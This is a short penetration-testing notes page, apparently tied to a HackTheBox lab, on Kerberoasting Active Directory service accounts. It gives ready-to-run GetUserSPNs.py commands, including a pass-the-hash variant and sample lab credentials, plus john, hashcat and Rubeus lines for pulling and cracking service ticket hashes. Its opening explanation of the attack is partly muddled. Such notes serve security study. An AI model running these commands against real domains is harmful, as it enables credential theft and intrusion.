# Kerberoasting

## Introduction

Kerberos encrypts Ticket Granting Tickets (TGTs) that are provided from the Domain Controller (DC) against a user's Kerberos hash. <mark style="color:red;">Kerberoasting</mark> means that <mark style="background-color:yellow;">a user has a Service Principal Name (SPN) associated with it</mark>. We can then theoretically request the SPN from the DC to send us the hash for us to crack. Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.

Note: You NEED valid credentials inside the domain to perform this attack.

## How To

### Get-UserSPNs.py

* Check if the user has a SPN with the following command:

```python
Get-UserSPNs.py -request -dc-ip <IP> search.htb/hope.sharp:IsolationIsKey

# The SPN will appear as RESEARCH/web_svc.search.htb:60001
# You will also get a hash, save it and crack with John

john --wordlist=/usr/share/wordlists/rockyou.txt hash

# Or Hashcat

hashcat -m 13100 -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

```
# Domain Account/Credentials Method
GetUserSPNs.py -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted

# Domain Account/Credentials Method w/ Pass The Hash
GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
```

### Rubeus

```
Rubeus.exe kerberoast
```

## Reference

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast" %}















